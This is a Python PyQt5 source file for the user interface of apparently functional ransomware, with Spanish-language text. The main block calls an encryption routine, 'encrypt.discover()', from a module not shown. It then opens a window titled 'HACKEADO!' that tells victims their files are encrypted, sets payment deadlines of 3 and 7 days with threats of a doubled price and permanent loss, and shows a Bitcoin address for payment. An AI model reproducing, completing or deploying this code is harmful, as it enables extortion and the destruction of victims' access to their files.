# -*- coding: utf-8 -*-
import sys
import encrypt

# Form implementation generated from reading ui file 'encryptView.ui'
#
# Created by: PyQt5 UI code generator 5.15.9
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox
class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(820, 625)
        MainWindow.setStyleSheet("QWidget#centralwidget{background-color: qlineargradient(spread:pad, x1:0, y1:0, x2:1, y2:0, stop:0 rgba(9, 41, 4, 255), stop:0.085 rgba(2, 79, 0, 255), stop:0.19 rgba(50, 147, 22, 255), stop:0.275 rgba(90, 236, 49, 255), stop:0.39 rgba(20, 156, 20, 255), stop:0.555 rgba(37, 59, 40, 255), stop:0.667 rgba(66, 165, 49, 255), stop:0.825 rgba(31, 199, 22, 255), stop:0.885 rgba(104, 222, 71, 255), stop:1 rgba(17, 32, 0, 255));}")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(280, 60, 441, 71))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(250, 130, 511, 391))
        self.label_2.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.label_2.setObjectName("label_2")
        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(660, 540, 111, 28))
        self.pushButton_2.setObjectName("pushButton_2")
        self.pushButton_2.clicked.connect(lambda: self.dontpushButton_2())
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(0, 20, 251, 561))
        self.label_3.setStyleSheet("image: url(:/prefijoNuevo/esqueletoSF.png);")
        self.label_3.setText("")
        self.label_3.setObjectName("label_3")
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
    def dontpushButton_2(self):
        msg_box = QMessageBox()
        msg_box.setWindowTitle("Bitcoin 🪙")
        msg_box.setText("Dirección de Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        msg_box.setIcon(QMessageBox.Information)

    # Mostrar el cuadro de diálogo y esperar por la respuesta del usuario
        msg_box.exec_()
        sys.exit(app.exec_())

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.label.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:16pt; font-weight:600; color:#ffffff;\">¿Qué pasó con mi computadora?</span></p></body></html>"))
        self.label_2.setText(_translate("MainWindow", "<html><head/><body><p>Tus archivos importantes están encriptados.</p><p>Muchos de tus documentos, fotos, videos y otros archivos ya no están</p><p>accesibles porque han sido encriptados.</p><p>Tal vez estés ocupado buscando una forma de</p><p>recupera tus archivos, pero no pierdas tu tiempo.</p><p><span style=\" font-weight:600;\">Nadie puede recuperar sus archivos sin nuestro servicio de descifrado:</span></p><p><span style=\" font-weight:600;\">¿Puedo recuperar mis archivos?</span></p><p><span style=\" font-weight:600;\">Seguro Garantizamos que podrá recuperar todos tus archivos de</span></p><p><span style=\" font-weight:600;\">forma segura y sencilla. Pero si lo deseas deberas pagar</span></p><p><br/></p><p><span style=\" font-weight:600;\">Solo tiene 3 días para enviar el pago. Después de eso, el precio se duplicará.</span></p><p><span style=\" font-weight:600;\">Además, si no paga en 7 días, no podrá recuperar sus archivos para siempre.</span></p><p><br/></p></body></html>"))
        self.pushButton_2.setText(_translate("MainWindow", "Detalles de Pago"))
import recurso

if __name__ == '__main__':
    encrypt.discover()
    app = QtWidgets.QApplication(sys.argv)
    main_window = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(main_window)
    main_window.setWindowTitle("HACKEADO!")
    main_window.show()
    sys.exit(app.exec_())